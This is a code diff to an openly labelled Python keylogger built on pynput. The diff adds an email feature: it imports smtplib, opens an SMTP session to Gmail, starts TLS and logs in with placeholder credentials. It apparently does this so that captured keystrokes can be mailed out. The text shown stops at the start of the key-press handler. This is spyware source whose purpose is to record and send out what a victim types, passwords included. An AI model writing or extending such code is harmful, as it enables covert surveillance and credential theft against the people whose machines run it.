@@ -1,12 +1,22 @@
-#import library
+#import library for keylogger
 import pynput
 from pynput.keyboard import Key, Listener
 
+#import library for email feature
+import smtplib
+from email.mime.text import MIMEText
 
 count = 0
 Keys = []
 
+#create session for email feature
+s = smtplib.SMTP('smtp.gmail.com', 587)
 
+#start TLS security feature
+s.starttls()
+
+#email login
+s.login('abcdefg@gmail.com','password')
 
 def on_press(key):
     global keys, count
